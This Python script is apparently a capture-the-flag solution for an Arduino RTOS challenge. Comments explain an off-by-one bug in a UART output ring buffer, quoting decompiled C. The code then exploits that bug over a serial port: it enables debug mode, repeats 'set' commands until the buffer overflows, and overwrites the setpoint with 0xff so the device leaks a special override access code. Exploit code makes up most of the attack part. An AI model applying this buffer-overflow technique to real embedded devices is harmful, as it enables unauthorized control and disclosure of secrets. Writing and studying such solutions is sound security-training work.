import serial
import time

# The application is a small RTOS with five round-robin tasks.
# PWM output, PWM adjust, UART output, UART input/command handling, systemMonitor.

# The pwm output task blinks the arduino LED with a duty cycle.

# It is possible to set the PWM output level with UART commands,
# it takes commands set x, where x = 0-9. The PWM level is x*28,
# so the maximum value is 9*28 = 252

# The monitoring task continously checks that the PWM is in the
# correct range. If it is above 250, it will print a warning
# message. If it reaches 255, the PWM level is critical and
# it prints out the emergency shutdown override access code.
# This code is VERY SPECIAL and gives a lot of power.

# The PWM adjust thread smoothly adjusts the actual pwm value
# to the value that is set by the user.

# The bug is an off by one in the output uart buffer.

'''
void uartPutChar(char cParm1,undefined uParm2)
{
  if (cParm1 == '\n') {
    Whi = uartBufWriteIndex;
    Z = CONCAT11(-(((byte)(uartBufWriteIndex + 0x88) < 0x78) + -2),uartBufWriteIndex + 0x88);
    uParm2 = 0xd;
    *(undefined *)(Z + 4) = 0xd;
    uartBufWriteIndex = Whi + 1; /* <- MISSING MODULUS */
  }
  Whi = uartBufWriteIndex;
  Z = CONCAT11(-(((byte)(uartBufWriteIndex + 0x88) < 0x78) + -2),uartBufWriteIndex + 0x88);
  *(char *)(Z + 4) = cParm1;
  Whi = Whi + 1 & 0x1f;    /* <-  mod 32 (buffer size)*/
  uartBufWriteIndex = Whi;
  return;
}
'''

# The UART output is stored in a ring buffer. When a newline
# is written, the function first puts a newline in the buffer.
# But, this increase has missed the modulus.

# If the write index is at the last position, there will be a
# newline (0x0a) written after the UART output buffer.
# This location holds the index to the read buffer. By design ;)

# However, the read command function zeroes this value before
# it starts reading, so it is not possible to use the output
# of normal commands to control the value.

# There is a debug function that prints out the progress of
# the pwm adjust thread. When the value has reached the
# setpoint it prints "reached\n" wich can be used to
# overflow the buffer.

# The solution does not need much precision, just enable
# debug mode, give setpoints until the reply only has
# a carriage return and no newline, the overwrite the
# setpoint value with 0xff directly. Then wait for the
# value to reach critical level.

# Exploit:

print("Opening connection...")
s = serial.Serial('/dev/ttyACM0', baudrate=9600, timeout=0.1)

print("Resetting...")
s.write('\nrst\n')
reply = ''
while not 'RESET' in reply:
	print("Wait for reset...")
	reply += s.read(999)
assert 'RESET' in reply

# Enable debug mode
s.write('dbg\n')
reply = s.read(999)
print reply

# Send 'set 0' until the "reached" reply does not have a newline
reply = 'reached\r\n'
while 'reached\r\n' in reply:
	s.write('set 0\n')
	reply = ''
	while not 'reached' in reply:
		reply += s.read(999)
	print repr(reply)

# Overwrite the setpoint values with 255
s.write('\xff'*10)

# Print all data until system reset
counter = 0
while not 'RESET' in reply:
	reply = s.read(999)
	counter += reply.count('+')
	print counter, 255, repr(reply)

